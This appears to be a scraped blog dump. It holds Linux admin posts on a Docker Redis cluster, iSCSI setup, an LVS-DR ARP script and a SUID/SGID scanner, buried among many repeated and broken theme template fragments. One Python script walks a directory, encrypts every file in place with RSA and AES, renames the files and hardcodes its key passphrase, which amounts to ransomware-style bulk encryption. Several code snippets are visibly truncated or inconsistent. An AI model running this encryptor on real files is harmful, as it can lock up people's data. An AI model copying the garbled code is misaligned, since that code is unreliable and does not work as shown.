{% if aplayer.enabled %}
  <!-- require APlayer -->
  <link rel="stylesheet" href="{{aplayer.cdn.css}}">
  <script src="{{aplayer.cdn.js}}"></script>
  <!-- require MetingJS -->
  <script src="{{aplayer.cdn.meting}}"></script>
  <meting-js
    server="{{aplayer.server}}"
    type="{{aplayer.type}}"
    fixed="{{aplayer.fixed}}"
    id="{{aplayer.id}}"
    auto="{{aplayer.auto}}"
    mini="{{aplayer.mini}}"
    autoplay="{{aplayer.autoplay}}"
    theme="{{aplayer.theme}}"
    loop="{{aplayer.loop}}"
    order="{{aplayer.order}}"
    preload="{{aplayer.preload}}"
    volume="{{aplayer.volume}}"
    mutex="{{aplayer.mutex}}"
    list-folded="{{aplayer.listfolded}}"
    list-max-height="{{aplayer.listmaxheight}}"
    storage-name="{{aplayer.storagename}}" >
  </meting-js>
{% endif %}

<script>
  document.addEventListener("DOMContentLoaded", function() {
    //  div.table-container 
    const tableContainers = document.querySelectorAll(".table-container");

    //  div.table-container 
    tableContainers.forEach(function(tableContainer) {
      //  div.table-container  span 
      const spanCount = tableContainer.querySelectorAll("tbody > tr > td.code > pre > span").length;

      //  span  >= 3
      if (spanCount >= 11) {
        //  div.table-container  figcaption 
        const prevElement = tableContainer.previousElementSibling;
        let figcaption;
        let iElement;
        if (!prevElement || prevElement.tagName.toLowerCase() !== "figcaption") {
          //  div.table-container  figcaption 
          figcaption = document.createElement("figcaption");

          //  figcaption  DOM 
          tableContainer.parentNode.insertBefore(figcaption, tableContainer);
        } else {
          figcaption = prevElement;
        }

        //  <i> 
        iElement = document.createElement("i");
        iElement.className = "fas fa-angle-down";
        // 
        iElement.innerHTML = "   ";
        figcaption.insertBefore(iElement, figcaption.firstChild);

        //  <i> 
        iElement.addEventListener("click", function() {
          //  tableContainer  "code-hidden" 
          tableContainer.classList.toggle("code-hidden");

          //  <i> 
          if (iElement.classList.contains("fa-angle-down")) {
            iElement.classList.remove("fa-angle-down");
            iElement.classList.add("fa-angle-right");
          } else {
            iElement.classList.remove("fa-angle-right");
            iElement.classList.add("fa-angle-down");
          }
        });
      }
    });
  });
</script>

Post.title: Redis
Post._content:
### 

1. 

```bash
docker pull redis:6.0.8
```

<!-- more -->

2. 

```bash
docker run -d --name redis-node-1 --net host --privileged=true -v /docker/redis/share/redis-node-1:/data redis:6.0.8 --cluster-enabled yes --appendonly yes --port 6381
docker run -d --name redis-node-2 --net host --privileged=true -v /docker/redis/share/redis-node-2:/data redis:6.0.8 --cluster-enabled yes --appendonly yes --port 6382
docker run -d --name redis-node-3 --net host --privileged=true -v /docker/redis/share/redis-node-3:/data redis:6.0.8 --cluster-enabled yes --appendonly yes --port 6383
docker run -d --name redis-node-4 --net host --privileged=true -v /docker/redis/share/redis-node-4:/data redis:6.0.8 --cluster-enabled yes --appendonly yes --port 6384
docker run -d --name redis-node-5 --net host --privileged=true -v /docker/redis/share/redis-node-5:/data redis:6.0.8 --cluster-enabled yes --appendonly yes --port 6385
docker run -d --name redis-node-6 --net host --privileged=true -v /docker/redis/share/redis-node-6:/data redis:6.0.8 --cluster-enabled yes --appendonly yes --port 6386
```

<script>
  document.addEventListener("DOMContentLoaded", function() {
    //  div.table-container 
    const tableContainers = document.querySelectorAll(".table-container");

    //  div.table-container 
    tableContainers.forEach(function(tableContainer) {
      //  div.table-container  span 
      const spanCount = tableContainer.querySelectorAll("tbody > tr > td.code > pre > span").length;

      //  span  >= 3
      if (spanCount >= 11) {
        //  div.table-container  figcaption 
        const prevElement = tableContainer.previousElementSibling;
        let figcaption;
        let iElement;
        if (!prevElement || prevElement.tagName.toLowerCase() !== "figcaption") {
          //  div.table-container  figcaption 
          figcaption = document.createElement("figcaption");

          //  figcaption  DOM 
          tableContainer.parentNode.insertBefore(figcaption, tableContainer);
        } else {
          figcaption = prevElement;
        }

        //  <i> 
        iElement = document.createElement("i");
        iElement.className = "fas fa-angle-down";
        // 
        iElement.innerHTML = "   ";
        figcaption.insertBefore(iElement, figcaption.firstChild);

        //  <i> 
        iElement.addEventListener("click", function() {
          //  tableContainer  "code-hidden" 
          tableContainer.classList.toggle("code-hidden");

          //  <i> 
          if (iElement.classList.contains("fa-angle-down")) {
            iElement.classList.remove("fa-angle-down");
            iElement.classList.add("fa-angle-right");
          } else {
            iElement.classList.remove("fa-angle-right");
            iElement.classList.add("fa-angle-down");
          }
        });
      }
    });
  });
</script>

<script>
  document.addEventListener("DOMContentLoaded", function() {
    //  div.table-container 
    const tableContainers = document.querySelectorAll(".table-container");

    //  div.table-container 
    tableContainers.forEach(function(tableContainer) {
      //  div.table-container  span 
      const spanCount = tableContainer.querySelectorAll("tbody > tr > td.code > pre > span").length;

      //  span  >= 3
      if (spanCount >= 11) {
        //  div.table-container  figcaption 
        const prevElement = tableContainer.previousElementSibling;
        let figcaption;
        let iElement;
        if (!prevElement || prevElement.tagName.toLowerCase() !== "figcaption") {
          //  div.table-container  figcaption 
          figcaption = document.createElement("figcaption");

          //  figcaption  DOM 
          tableContainer.parentNode.insertBefore(figcaption, tableContainer);
        } else {
          figcaption = prevElement;
        }

        //  <i> 
        iElement = document.createElement("i");
        iElement.className = "fas fa-angle-down";
        // 
        iElement.innerHTML = "   ";
        figcaption.insertBefore(iElement, figcaption.firstChild);

        //  <i> 
        iElement.addEventListener("click", function() {
          //  tableContainer  "code-hidden" 
          tableContainer.classList.toggle("code-hidden");

          //  <i> 
          if (iElement.classList.contains("fa-angle-down")) {
            iElement.classList.remove("fa-angle-down");
            iElement.classList.add("fa-angle-right");
          } else {
            iElement.classList.remove("fa-angle-right");
            iElement.classList.add("fa-angle-down");
          }
        });
      }
    });
  });
</script>

{% if aplayer.enabled %}
  <!-- require APlayer -->
  <link rel="stylesheet" href="{{aplayer.cdn.css}}">
  <script src="{{aplayer.cdn.js}}"></script>
  <!-- require MetingJS -->
  <script src="{{aplayer.cdn.meting}}"></script>
  <meting-js
    server="{{aplayer.server}}"
    type="{{aplayer.type}}"
    fixed="{{aplayer.fixed}}"
    id="{{aplayer.id}}"
    auto="{{aplayer.auto}}"
    mini="{{aplayer.mini}}"
    autoplay="{{aplayer.autoplay}}"
    theme="{{aplayer.theme}}"
    loop="{{aplayer.loop}}"
    order="{{aplayer.order}}"
    preload="{{aplayer.preload}}"
    volume="{{aplayer.volume}}"
    mutex="{{aplayer.mutex}}"
    list-folded="{{aplayer.listfolded}}"
    list-max-height="{{aplayer.listmaxheight}}"
    storage-name="{{aplayer.storagename}}" >
  </meting-js>
{% endif %}
data.body-end:
<script>
  document.addEventListener("DOMContentLoaded", function() {
    //  div.table-container 
    const tableContainers = document.querySelectorAll(".table-container");

    //  div.table-container 
    tableContainers.forEach(function(tableContainer) {
      //  div.table-container  span 
      const spanCount = tableContainer.querySelectorAll("tbody > tr > td.code > pre > span").length;

      //  span  >= 3
      if (spanCount >= 11) {
        //  div.table-container  figcaption 
        const prevElement = tableContainer.previousElementSibling;
        let figcaption;
        let iElement;
        if (!prevElement || prevElement.tagName.toLowerCase() !== "figcaption") {
          //  div.table-container  figcaption 
          figcaption = document.createElement("figcaption");

          //  figcaption  DOM 
          tableContainer.parentNode.insertBefore(figcaption, tableContainer);
        } else {
          figcaption = prevElement;
        }

        //  <i> 
        iElement = document.createElement("i");
        iElement.className = "fas fa-angle-down";
        // 
        iElement.innerHTML = "   ";
        figcaption.insertBefore(iElement, figcaption.firstChild);

        //  <i> 
        iElement.addEventListener("click", function() {
          //  tableContainer  "code-hidden" 
          tableContainer.classList.toggle("code-hidden");

          //  <i> 
          if (iElement.classList.contains("fa-angle-down")) {
            iElement.classList.remove("fa-angle-down");
            iElement.classList.add("fa-angle-right");
          } else {
            iElement.classList.remove("fa-angle-right");
            iElement.classList.add("fa-angle-down");
          }
        });
      }
    });
  });
</script>

```bash 
# This file is written by xdg-user-dirs-update
# If you want to change or add directories, just edit the line you're
# interested in. All local changes will be retained on the next run.
# Format is XDG_xxx_DIR="$HOME/yyy", where yyy is a shell-escaped
# homedir-relative path, or XDG_xxx_DIR="/yyy", where /yyy is an
# absolute path. No other format is supported.
# 
XDG_DESKTOP_DIR="$HOME/"
XDG_DOWNLOAD_DIR="$HOME/"
XDG_TEMPLATES_DIR="$HOME/"
XDG_PUBLICSHARE_DIR="$HOME/"
XDG_DOCUMENTS_DIR="$HOME/"
XDG_MUSIC_DIR="$HOME/"
```

```bash
nginx.conf
```

<script>
  document.addEventListener("DOMContentLoaded", function() {
    //  div.table-container 
    const tableContainers = document.querySelectorAll(".table-container");

    //  div.table-container 
    tableContainers.forEach(function(tableContainer) {
      //  div.table-container  span 
      const spanCount = tableContainer.querySelectorAll("tbody > tr > td.code > pre > span").length;

      //  span  >= 3
      if (spanCount >= 11) {
        //  div.table-container  figcaption 
        const prevElement = tableContainer.previousElementSibling;
        let figcaption;
        let iElement;
        if (!prevElement || prevElement.tagName.toLowerCase() !== "figcaption") {
          //  div.table-container  figcaption 
          figcaption = document.createElement("figcaption");

          //  figcaption  DOM 
          tableContainer.parentNode.insertBefore(figcaption, tableContainer);
        } else {
          figcaption = prevElement;
        }

        //  <i> 
        iElement = document.createElement("i");
        iElement.className = "fas fa-angle-down";
        // 
        iElement.innerHTML = "   ";
        figcaption.insertBefore(iElement, figcaption.firstChild);

        //  <i> 
        iElement.addEventListener("click", function() {
          //  tableContainer  "code-hidden" 
          tableContainer.classList.toggle("code-hidden");

          //  <i> 
          if (iElement.classList.contains("fa-angle-down")) {
            iElement.classList.remove("fa-angle-down");
            iElement.classList.add("fa-angle-right");
          } else {
            iElement.classList.remove("fa-angle-right");
            iElement.classList.add("fa-angle-down");
          }
        });
      }
    });
  });
</script>

{% if aplayer.enabled %}

  <link rel="stylesheet" href="{{aplayer.cdn.css}}">

  <!-- require MetingJS -->

  <meting-js
    server="{{aplayer.server}}"
    type="{{aplayer.type}}"
    fixed="{{aplayer.fixed}}"
    id="{{aplayer.id}}"
    auto="{{aplayer.auto}}"
    mini="{{aplayer.mini}}"
    autoplay="{{aplayer.autoplay}}"
    theme="{{aplayer.theme}}"
    loop="{{aplayer.loop}}"
    order="{{aplayer.order}}"

data.body-end:
<script>
  document.addEventListener("DOMContentLoaded", function() {
    //  div.table-container 
    const tableContainers = document.querySelectorAll(".table-container");

    //  div.table-container 
    tableContainers.forEach(function(tableContainer) {
      //  div.table-container  span 
      const spanCount = tableContainer.querySelectorAll("tbody > tr > td.code > pre > span").length;

      //  span  >= 3
      if (spanCount >= 11) {
        //  div.table-container  figcaption 
        const prevElement = tableContainer.previousElementSibling;
        let figcaption;
        let iElement;
        if (!prevElement || prevElement.tagName.toLowerCase() !== "figcaption") {
          //  div.table-container  figcaption 
          figcaption = document.createElement("figcaption");

          //  figcaption  DOM 
          tableContainer.parentNode.insertBefore(figcaption, tableContainer);
        } else {
          figcaption = prevElement;
        }

        //  <i> 
        iElement = document.createElement("i");
        iElement.className = "fas fa-angle-down";
        // 
        iElement.innerHTML = "   ";
        figcaption.insertBefore(iElement, figcaption.firstChild);

        //  <i> 
        iElement.addEventListener("click", function() {
          //  tableContainer  "code-hidden" 
          tableContainer.classList.toggle("code-hidden");

          //  <i> 
          if (iElement.classList.contains("fa-angle-down")) {
            iElement.classList.remove("fa-angle-down");
            iElement.classList.add("fa-angle-right");
          } else {
            iElement.classList.remove("fa-angle-right");
            iElement.classList.add("fa-angle-down");
          }
        });
      }
    });
  });
</script>

    server="{{aplayer.server}}"
    type="{{aplayer.type}}"
    fixed="{{aplayer.fixed}}"
    id="{{aplayer.id}}"
    auto="{{aplayer.auto}}"
    mini="{{aplayer.mini}}"
    autoplay="{{aplayer.autoplay}}"
    theme="{{aplayer.theme}}"
    loop="{{aplayer.loop}}"
    order="{{aplayer.order}}"
    preload="{{aplayer.preload}}"
    volume="{{aplayer.volume}}"
    mutex="{{aplayer.mutex}}"

data.body-end:
<script>
  document.addEventListener("DOMContentLoaded", function() {
    //  div.table-container 
    const tableContainers = document.querySelectorAll(".table-container");

    //  div.table-container 
    tableContainers.forEach(function(tableContainer) {
      //  div.table-container  span 
      const spanCount = tableContainer.querySelectorAll("tbody > tr > td.code > pre > span").length;

      //  span  >= 3
      if (spanCount >= 11) {
        //  div.table-container  figcaption 
        const prevElement = tableContainer.previousElementSibling;
        let figcaption;
        let iElement;
        if (!prevElement || prevElement.tagName.toLowerCase() !== "figcaption") {
          //  div.table-container  figcaption 
          figcaption = document.createElement("figcaption");

          //  figcaption  DOM 
          tableContainer.parentNode.insertBefore(figcaption, tableContainer);
        } else {
          figcaption = prevElement;
        }

        //  <i> 
        iElement = document.createElement("i");
        iElement.className = "fas fa-angle-down";
        // 
        iElement.innerHTML = "   ";
        figcaption.insertBefore(iElement, figcaption.firstChild);

        //  <i> 
        iElement.addEventListener("click", function() {
          //  tableContainer  "code-hidden" 
          tableContainer.classList.toggle("code-hidden");

          //  <i> 
          if (iElement.classList.contains("fa-angle-down")) {
            iElement.classList.remove("fa-angle-down");
            iElement.classList.add("fa-angle-right");
          } else {
            iElement.classList.remove("fa-angle-right");
            iElement.classList.add("fa-angle-down");
          }
        });
      }
    });
  });
</script>

    server="{{aplayer.server}}"
    type="{{aplayer.type}}"
    fixed="{{aplayer.fixed}}"
    id="{{aplayer.id}}"
    auto="{{aplayer.auto}}"
    mini="{{aplayer.mini}}"
    autoplay="{{aplayer.autoplay}}"
    theme="{{aplayer.theme}}"
    loop="{{aplayer.loop}}"
    order="{{aplayer.order}}"
    preload="{{aplayer.preload}}"
    volume="{{aplayer.volume}}"
    mutex="{{aplayer.mutex}}"

    list-max-height="{{aplayer.listmaxheight}}"

data.body-end:
<script>
  document.addEventListener("DOMContentLoaded", function() {
    //  div.table-container 
    const tableContainers = document.querySelectorAll(".table-container");

    //  div.table-container 
    tableContainers.forEach(function(tableContainer) {
      //  div.table-container  span 
      const spanCount = tableContainer.querySelectorAll("tbody > tr > td.code > pre > span").length;

      //  span  >= 3
      if (spanCount >= 11) {
        //  div.table-container  figcaption 
        const prevElement = tableContainer.previousElementSibling;
        let figcaption;
        let iElement;
        if (!prevElement || prevElement.tagName.toLowerCase() !== "figcaption") {
          //  div.table-container  figcaption 
          figcaption = document.createElement("figcaption");

          //  figcaption  DOM 
          tableContainer.parentNode.insertBefore(figcaption, tableContainer);
        } else {
          figcaption = prevElement;
        }

        //  <i> 
        iElement = document.createElement("i");
        iElement.className = "fas fa-angle-down";
        // 
        iElement.innerHTML = "   ";
        figcaption.insertBefore(iElement, figcaption.firstChild);

        //  <i> 
        iElement.addEventListener("click", function() {
          //  tableContainer  "code-hidden" 
          tableContainer.classList.toggle("code-hidden");

          //  <i> 
          if (iElement.classList.contains("fa-angle-down")) {
            iElement.classList.remove("fa-angle-down");
            iElement.classList.add("fa-angle-right");
          } else {
            iElement.classList.remove("fa-angle-right");
            iElement.classList.add("fa-angle-down");
          }
        });
      }
    });
  });
</script>

Post._content:
### ISCSI

ISCSIsdb

1. 

```bash
yum install -y targetcli
```

2. 

* `targetcli`iscsi

```bash
targetcli
```

<!-- more -->

* 

```bash
cd /backstores/block/
create disk1 /dev/sdb
```

`disk1``/dev/sdb`

* iqn

```bash
cd /iscsi/
create iqn.2023-07.com.liuxp:san1
```

`iqn.2023-07.com.liuxp:san1`

* iqniqn

```bash
cd iqn.2023-07.com.liuxp:san1/tpg1/luns/
create /backstores/block/disk1
```

* iqniqn

```bash
cd ../acls/
create iqn.2023-07.com.liuxp:web1
```

iqn`acls``iqn`

* IP

```bash
cd ../portals/
delele 0.0.0.0 3260
create 10.8.7.41 3260
```

* `exit`

* 

```bash
systemctl start target.service 
```

### ISCSI

1. 

```bash
yum install -y iscsi-initiator-utils
```

2. `/etc/iscsi/initiatorname.iscsi`

```bash
InitiatorName=iqn.2023-07.com.liuxp:web1
```

iqn`acls`iqn

3. iqn

```bash
iscsiadm -m discovery -t st -p 10.8.7.41
```

**p**IP

4. 

```bash
iscsiadm -m node -T iqn.2023-07.com.liuxp:san1 -p 10.8.7.41 -l
```

**T**iqn**p**ISCSIIP

5. 

```bash
iscsiadm -m session
```

6. ISCSI

```bash
iscsiadm -m node --logoutall=all
```

7. 

4iqnaclsIP`/var/lib/iscsi/nodes``/var/lib/iscsi/send_targets`

* Web1arp

```bash 
#!/bin/bash
if [ $# -ne 1 ]
then
    echo 'error!'"usage:$0 on|off"
    exit 1
fi
case $1 in
    on)
        echo "1" > /proc/sys/net/ipv4/conf/lo/arp_ignore
        echo "2" > /proc/sys/net/ipv4/conf/lo/arp_announce
        echo "1" > /proc/sys/net/ipv4/conf/all/arp_ignore
        echo "2" > /proc/sys/net/ipv4/conf/all/arp_announce
        echo "LVS DR "
        ;;
    off)
        echo "0" > /proc/sys/net/ipv4/conf/lo/arp_ignore
        echo "0" > /proc/sys/net/ipv4/conf/lo/arp_announce
        echo "0" > /proc/sys/net/ipv4/conf/all/arp_ignore
        echo "0" > /proc/sys/net/ipv4/conf/all/arp_announce
        echo "LVS DR "
        ;;
    *)
        echo 'error!'"usage:$0 on|off"
        exit 1
esac
```

* 

```bash
chmod +x lvs_dr.sh
./lvs_dr.sh on
```

{% if aplayer.enabled %}
  <!-- require APlayer -->
  <link rel="stylesheet" href="{{aplayer.cdn.css}}">
  <script src="{{aplayer.cdn.js}}"></script>
  <!-- require MetingJS -->
  <script src="{{aplayer.cdn.meting}}"></script>
  <meting-js
    server="{{aplayer.server}}"
    type="{{aplayer.type}}"
    fixed="{{aplayer.fixed}}"
    id="{{aplayer.id}}"
    auto="{{aplayer.auto}}"
    mini="{{aplayer.mini}}"
    autoplay="{{aplayer.autoplay}}"
    theme="{{aplayer.theme}}"
    loop="{{aplayer.loop}}"
    order="{{aplayer.order}}"
    preload="{{aplayer.preload}}"
    volume="{{aplayer.volume}}"
    mutex="{{aplayer.mutex}}"
    list-folded="{{aplayer.listfolded}}"
    list-max-height="{{aplayer.listmaxheight}}"
    storage-name="{{aplayer.storagename}}" >
  </meting-js>
{% endif %}
data.body-end:
<script>
  document.addEventListener("DOMContentLoaded", function() {
    //  div.table-container 
    const tableContainers = document.querySelectorAll(".table-container");

    //  div.table-container 
    tableContainers.forEach(function(tableContainer) {
      //  div.table-container  span 
      const spanCount = tableContainer.querySelectorAll("tbody > tr > td.code > pre > span").length;

      //  span  >= 3
      if (spanCount >= 11) {
        //  div.table-container  figcaption 
        const prevElement = tableContainer.previousElementSibling;
        let figcaption;
        let iElement;
        if (!prevElement || prevElement.tagName.toLowerCase() !== "figcaption") {
          //  div.table-container  figcaption 
          figcaption = document.createElement("figcaption");

          //  figcaption  DOM 
          tableContainer.parentNode.insertBefore(figcaption, tableContainer);
        } else {
          figcaption = prevElement;
        }

        //  <i> 
        iElement = document.createElement("i");
        iElement.className = "fas fa-angle-down";
        // 
        iElement.innerHTML = "   ";
        figcaption.insertBefore(iElement, figcaption.firstChild);

        //  <i> 
        iElement.addEventListener("click", function() {
          //  tableContainer  "code-hidden" 
          tableContainer.classList.toggle("code-hidden");

          //  <i> 
          if (iElement.classList.contains("fa-angle-down")) {
            iElement.classList.remove("fa-angle-down");
            iElement.classList.add("fa-angle-right");
          } else {
            iElement.classList.remove("fa-angle-right");
            iElement.classList.add("fa-angle-down");
          }
        });
      }
    });
  });
</script>

```bash 
from Crypto.PublicKey import RSA


def CreateRSAKeys():

    key = RSA.generate(2048)

        f.write(encrypted_key)
    #

        f.write(key.publickey().exportKey())


CreateRSAKeys()
```

```bash 
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes


def Encrypt(filename):
    data = ''
    # 
    with open(filename, 'rb') as f:
        data = f.read()
    with open(filename, 'wb') as out_file:
        #  - 
        recipient_key = RSA.import_key(open('zmy_rsa.pub').read())
        #  16 
        session_key = get_random_bytes(16)
        # Encrypt the session key with the public RSA key
        cipher_rsa = PKCS1_OAEP.new(recipient_key)
        out_file.write(cipher_rsa.encrypt(session_key))
        # Encrypt the data with the AES session key
        cipher_aes = AES.new(session_key, AES.MODE_EAX)

        ciphertext, tag = cipher_aes.encrypt_and_digest(data)
        out_file.write(cipher_aes.nonce)
        out_file.write(tag)
        out_file.write(ciphertext)


Encrypt("e://test/music.mp3")

```

```bash 
from Crypto.PublicKey import RSA

def Descrypt(filename):
    code = 'nooneknows'
```

```bash 
# coding=utf-8
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
from Crypto.Cipher import AES, PKCS1_OAEP
import os
import base64


def CreateRSAKeys():
    code = 'nooneknows'
    key = RSA.generate(2048)
    encrypted_key = key.exportKey(passphrase=code, pkcs=8, protection="scryptAndAES128-CBC")
    # 
    with open('zmy_rsa', 'wb') as f:
        f.write(encrypted_key)
    # 
    with open('zmy_rsa.pub', 'wb') as f:
        f.write(key.publickey().exportKey())


def Encrypt(filename):
    data = ''
    with open(filename, 'rb') as f:
        data = f.read()
    with open(filename, 'wb') as out_file:
        #  - 
        recipient_key = RSA.import_key(open('zmy_rsa.pub').read())
        session_key = get_random_bytes(16)
        # Encrypt the session key with the public RSA key
        cipher_rsa = PKCS1_OAEP.new(recipient_key)
        out_file.write(cipher_rsa.encrypt(session_key))
        # Encrypt the data with the AES session key
        cipher_aes = AES.new(session_key, AES.MODE_EAX)
        ciphertext, tag = cipher_aes.encrypt_and_digest(data)
        out_file.write(cipher_aes.nonce)
        out_file.write(tag)
        out_file.write(ciphertext)


def Descrypt(filename):
    code = 'nooneknows'
    with open(filename, 'rb') as fobj:
        # 
        private_key = RSA.import_key(open('zmy_rsa').read(), passphrase=code)
        #  
        enc_session_key, nonce, tag, ciphertext = [fobj.read(x)
                                                   for x in (private_key.size_in_bytes(),
                                                             16, 16, -1)]
        cipher_rsa = PKCS1_OAEP.new(private_key)
        session_key = cipher_rsa.decrypt(enc_session_key)
        cipher_aes = AES.new(session_key, AES.MODE_EAX, nonce)
        # 
        data = cipher_aes.decrypt_and_verify(ciphertext, tag)

    with open(filename, 'wb') as wobj:
        wobj.write(data)


def RenameFile(dir, filename):
    filename_bytes = filename.encode('utf-8')
    filename_bytes_base64 = base64.encodebytes(filename_bytes)

    filename_bytes_base64 = filename_bytes_base64[::-1][1:]
    new_filename = filename_bytes_base64.decode('utf-8') + '.liuxp'

    # print (new_filename)
    print(os.path.join(dir, filename))
    print(os.path.join(dir, new_filename))
    os.rename(os.path.join(dir, filename), os.path.join(dir, new_filename))


def ReserveFilename(dir, filename):
    f = filename
    filename = filename[::-1][6:][::-1]
    filename_base64 = filename[::-1] + '\n'
    filename_bytes_base64 = filename_base64.encode('ascii')  # encode as ASCII
    ori_filename = base64.decodebytes(filename_bytes_base64).decode('utf-8')
    new_filename = ori_filename

    # print(new_filename)
    print(os.path.join(dir, f))
    print(os.path.join(dir, new_filename))
    os.rename(os.path.join(dir, f), os.path.join(dir, new_filename))


#

def Main(rootDir):
    list_dirs = os.walk(rootDir)
    for root, dirs, files in list_dirs:
        #

        if True:  # 
            # 
            for f in files:

                Encrypt(filename)
                RenameFile(root, f)
        else:
            # 
            for f in files:
                filename = os.path.join(root, f)
                Descrypt(filename)
                ReserveFilename(root, f)


if __name__ == '__main__':
    # CreateRSAKeys()
    d = "e://test/"
    Main(d)
```

        //  div.table-container  figcaption

          //  figcaption  DOM 
          tableContainer.parentNode.insertBefore(figcaption, tableContainer);
        } else {

<script>
  document.addEventListener("DOMContentLoaded", function() {
    //  div.table-container 
    const tableContainers = document.querySelectorAll(".table-container");

    //  div.table-container 
    tableContainers.forEach(function(tableContainer) {
      //  div.table-container  span 
      const spanCount = tableContainer.querySelectorAll("tbody > tr > td.code > pre > span").length;

      //  span  >= 3
      if (spanCount >= 11) {
        //  div.table-container  figcaption 
        const prevElement = tableContainer.previousElementSibling;
        let figcaption;
        let iElement;
        if (!prevElement || prevElement.tagName.toLowerCase() !== "figcaption") {
          //  div.table-container  figcaption 
          figcaption = document.createElement("figcaption");

          //  figcaption  DOM 
          tableContainer.parentNode.insertBefore(figcaption, tableContainer);
        } else {
          figcaption = prevElement;
        }

        //  <i> 
        iElement = document.createElement("i");
        iElement.className = "fas fa-angle-down";
        // 
        iElement.innerHTML = "   ";
        figcaption.insertBefore(iElement, figcaption.firstChild);

        //  <i> 
        iElement.addEventListener("click", function() {
          //  tableContainer  "code-hidden" 
          tableContainer.classList.toggle("code-hidden");

          //  <i> 
          if (iElement.classList.contains("fa-angle-down")) {
            iElement.classList.remove("fa-angle-down");
            iElement.classList.add("fa-angle-right");
          } else {
            iElement.classList.remove("fa-angle-right");
            iElement.classList.add("fa-angle-down");
          }
        });
      }
    });
  });
</script>

<script>
  document.addEventListener("DOMContentLoaded", function() {
    //  div.table-container 
    const tableContainers = document.querySelectorAll(".table-container");

    //  div.table-container 
    tableContainers.forEach(function(tableContainer) {
      //  div.table-container  span 
      const spanCount = tableContainer.querySelectorAll("tbody > tr > td.code > pre > span").length;

      //  span  >= 3
      if (spanCount >= 11) {
        //  div.table-container  figcaption 
        const prevElement = tableContainer.previousElementSibling;
        let figcaption;
        let iElement;
        if (!prevElement || prevElement.tagName.toLowerCase() !== "figcaption") {
          //  div.table-container  figcaption 
          figcaption = document.createElement("figcaption");

          //  figcaption  DOM 
          tableContainer.parentNode.insertBefore(figcaption, tableContainer);
        } else {
          figcaption = prevElement;
        }

        //  <i> 
        iElement = document.createElement("i");
        iElement.className = "fas fa-angle-down";
        // 
        iElement.innerHTML = "   ";
        figcaption.insertBefore(iElement, figcaption.firstChild);

        //  <i> 
        iElement.addEventListener("click", function() {
          //  tableContainer  "code-hidden" 
          tableContainer.classList.toggle("code-hidden");

          //  <i> 
          if (iElement.classList.contains("fa-angle-down")) {
            iElement.classList.remove("fa-angle-down");
            iElement.classList.add("fa-angle-right");
          } else {
            iElement.classList.remove("fa-angle-right");
            iElement.classList.add("fa-angle-down");
          }
        });
      }
    });
  });
</script>

  document.addEventListener("DOMContentLoaded", function() {
    //  div.table-container 
    const tableContainers = document.querySelectorAll(".table-container");

    //  div.table-container 
    tableContainers.forEach(function(tableContainer) {
      //  div.table-container  span 
      const spanCount = tableContainer.querySelectorAll("tbody > tr > td.code > pre > span").length;

      //  span  >= 3
      if (spanCount >= 11) {
        //  div.table-container  figcaption 
        const prevElement = tableContainer.previousElementSibling;
        let figcaption;
        let iElement;
        if (!prevElement || prevElement.tagName.toLowerCase() !== "figcaption") {
          //  div.table-container  figcaption 
          figcaption = document.createElement("figcaption");

          //  figcaption  DOM 
          tableContainer.parentNode.insertBefore(figcaption, tableContainer);
        } else {
          figcaption = prevElement;
        }

        //  <i> 
        iElement = document.createElement("i");
        iElement.className = "fas fa-angle-down";
        // 
        iElement.innerHTML = "   ";
        figcaption.insertBefore(iElement, figcaption.firstChild);

        //  <i> 
        iElement.addEventListener("click", function() {
          //  tableContainer  "code-hidden" 
          tableContainer.classList.toggle("code-hidden");

          //  <i> 
          if (iElement.classList.contains("fa-angle-down")) {
            iElement.classList.remove("fa-angle-down");
            iElement.classList.add("fa-angle-right");

            iElement.classList.add("fa-angle-down");
          }
        });
      }
    });
  });
</script>

<script>
  document.addEventListener("DOMContentLoaded", function() {
    //  div.table-container 
    const tableContainers = document.querySelectorAll(".table-container");

    //  div.table-container 
    tableContainers.forEach(function(tableContainer) {
      //  div.table-container  span 
      const spanCount = tableContainer.querySelectorAll("tbody > tr > td.code > pre > span").length;

      //  span  >= 3
      if (spanCount >= 11) {
        //  div.table-container  figcaption 
        const prevElement = tableContainer.previousElementSibling;
        let figcaption;
        let iElement;
        if (!prevElement || prevElement.tagName.toLowerCase() !== "figcaption") {
          //  div.table-container  figcaption 
          figcaption = document.createElement("figcaption");

          //  figcaption  DOM 
          tableContainer.parentNode.insertBefore(figcaption, tableContainer);
        } else {
          figcaption = prevElement;
        }

        //  <i> 
        iElement = document.createElement("i");
        iElement.className = "fas fa-angle-down";
        // 
        iElement.innerHTML = "   ";
        figcaption.insertBefore(iElement, figcaption.firstChild);

        //  <i> 
        iElement.addEventListener("click", function() {
          //  tableContainer  "code-hidden" 
          tableContainer.classList.toggle("code-hidden");

          //  <i> 
          if (iElement.classList.contains("fa-angle-down")) {
            iElement.classList.remove("fa-angle-down");
            iElement.classList.add("fa-angle-right");
          } else {
            iElement.classList.remove("fa-angle-right");
            iElement.classList.add("fa-angle-down");
          }
        });
      }
    });
  });
</script>

Post.title: SUID SGID
Post._content:
### 

linux SUID  SGID  Linux  SUID  SGID  SUID  SGID 

<!-- more -->

```bash 
#!/bin/bash

# 
if [ $# -ne 1 ]; then
    echo ": $0 <>"
    exit 1
fi

# 
scan_directory="$1"

# 
if [ ! -d "$scan_directory" ]; then
    echo ": $scan_directory"
    exit 1
fi

# 
output_file="suid_sgid_files.txt"
touch "$output_file"

# SUIDSGID
echo "$(date "+%F %H:%M")" >> "$output_file"
echo "SUIDSGID" >> "$output_file"
find "$scan_directory" -type f \( -perm -4000 -o -perm -2000 \) -exec ls -l {} \; >> "$output_file" 2>/dev/null
find "$scan_directory" -type d \( -perm -4000 -o -perm -2000 \) -exec ls -ld {} \; >> "$output_file" 2>/dev/null

echo " $output_file"
```

        //  <i>

        iElement.className = "fas fa-angle-down";
        // 
        iElement.innerHTML = "   ";
        figcaption.insertBefore(iElement, figcaption.firstChild);

        //  <i>

          //  tableContainer  "code-hidden"

        });

  });

data.body-end:
<script>
  document.addEventListener("DOMContentLoaded", function() {
    //  div.table-container 
    const tableContainers = document.querySelectorAll(".table-container");

    //  div.table-container 
    tableContainers.forEach(function(tableContainer) {
      //  div.table-container  span 
      const spanCount = tableContainer.querySelectorAll("tbody > tr > td.code > pre > span").length;

      //  span  >= 3
      if (spanCount >= 11) {
        //  div.table-container  figcaption 
        const prevElement = tableContainer.previousElementSibling;
        let figcaption;
        let iElement;
